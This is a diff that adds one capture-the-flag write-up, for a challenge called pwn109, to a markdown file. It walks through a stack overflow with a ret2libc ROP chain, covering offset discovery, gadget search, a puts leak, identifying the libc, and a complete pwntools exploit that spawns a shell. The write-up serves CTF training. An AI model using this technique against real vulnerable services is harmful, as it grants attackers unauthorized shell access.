@@ -490,3 +490,103 @@ io.interactive()
 ```
 
 <p align="center"> <img src="assets/Untitled%2043.png"> </p>
+
+# Challenge 9 - pwn109
+
+<p align="center"> <img src="assets/Untitled%2044.png"> </p>
+
+No PIE and no stack canary good news. We can not execute shell with shellcode because NX is enabled. 
+
+<p align="center"> <img src="assets/Untitled%2045.png"> </p>
+
+When we overflow buffer we see that  “aaal” overwritten on return address. Offset is 44-4= 40 because of “aaal” is detected when “l” appears, “l” is located at 44 but “aaal” located at 40.
+
+<p align="center"> <img src="assets/Untitled%2046.png"> </p>
+
+<p align="center"> <img src="assets/Untitled%2047.png"> </p>
+
+We have only one shot, it should be the head-shot, right? No not right, we can manipulate it to get more shots. ROP chain is our friend which gives us one more chance. We gonna follow this way:
+
+> ret → pop rdi ; ret → leak put’s address → print leaked address → call main again
+> 
+
+We need to know “ret” (normally we don’t need to specify another ret but MOVAPS issue…) and “pop rdi” gadget’s locations. We can check them with ROPgadget and grep.
+
+```python
+ROPgadget --binary pwn109.pwn109 | grep "ret"
+ROPgadget --binary pwn109.pwn109 | grep "pop rdi ; ret"
+```
+
+<p align="center"> <img src="assets/Untitled%2048.png"> </p>
+
+<p align="center"> <img src="assets/Untitled%2049.png"> </p>
+
+We can write the exploit but there are custom characters and we need to know their hex values. Because we gonna use them in io.recvuntil(). With these lines of code we found hex value of that emoji.
+
+<p align="center"> <img src="assets/Untitled%2050.png"> </p>
+
+There is a problem about libc. We exploit this binary in local with our libc but target machine runs different libc. We need to know which libc version the target uses but we can not ask the target machine “Hey, which libc version do you use”. We have to make a guess thanks to this website:
+
+[libc database search](https://libc.nullbyte.cat/)
+
+<p align="center"> <img src="assets/Untitled%2051.png"> </p>
+
+<p align="center"> <img src="assets/Untitled%2052.png"> </p>
+
+We gonna download this libc and use it. We write our exploit and done.
+
+```python
+import sys
+from pwn import *
+from struct import *
+
+exe = './pwn109.pwn109'
+binary = context.binary = ELF(exe,checksec=False)
+
+libc = ELF("libc6_2.27-3ubuntu1.4_amd64.so")
+# libc = binary.libc # use it locally
+
+def start(argv=[], *a, **kw):
+    if args.REMOTE:
+        return remote(sys.argv[1], sys.argv[2], *a, **kw)
+    else:
+        return process([exe] + argv, *a, **kw)
+
+io = start()
+
+RET = 0x40101a   # for stack alignment
+POP_RDI = 0x4012a3
+
+exploit = b""
+exploit += b"\x90"*40
+exploit += p64(RET)
+exploit += p64(POP_RDI)
+
+exploit += p64(binary.got['puts'])  # the address of got puts is the parameter
+exploit += p64(binary.plt['puts'])  # call puts via plt
+exploit += p64(binary.sym['main'])  # return address (will be popped into eip when printf returns)
+
+io.recvuntil(b'Go ahead \xf0\x9f\x98\x8f')
+data = io.recvline()
+io.sendline(exploit)
+
+puts_leak = u64(io.recv(6) + b'\x00\x00')
+
+# log.success(f'LIBC base: {hex(puts_leak)}') # uncomment this to detect target's libc version
+
+libc.address = puts_leak - libc.sym['puts'] # comment this when you try to find libc version
+log.success(f'LIBC base: {hex(libc.address)}') # comment this when you try to find libc version
+
+rop = ROP(libc)
+rop.call(rop.ret)     # Stack align with extra 'ret' to deal with movaps issue
+rop.system(next(libc.search(b'/bin/sh')), 0, 0)
+
+io.recvuntil(b'Go ahead \xf0\x9f\x98\x8f')
+io.recvline()
+io.sendline(b'\x90'*40 + rop.chain())
+
+io.clean()
+io.interactive()
+```
+
+<p align="center"> <img src="assets/Untitled%2053.png"> </p>
